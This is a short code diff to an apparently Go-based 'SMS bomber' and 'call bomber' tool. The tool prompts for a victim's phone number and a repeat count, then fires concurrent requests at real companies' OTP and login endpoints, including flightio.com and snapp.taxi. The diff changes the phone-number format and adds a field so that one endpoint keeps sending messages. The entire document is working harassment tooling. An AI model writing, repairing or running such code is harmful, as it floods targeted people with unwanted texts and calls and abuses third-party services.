@@ -102,6 +102,7 @@ func main() {
 	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
 	fmt.Scan(&phone)
+        formattedPhone := "98-" + phone 
 
 	var repeatCount int
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
@@ -128,7 +129,8 @@ ch := make(chan int)
 		}, ch)
 
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
+			"userKey": formattedPhone, 
+			"userKeyType": 1,
 		}, ch)
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", map[string]interface{}{
 			"cellphone": phone,
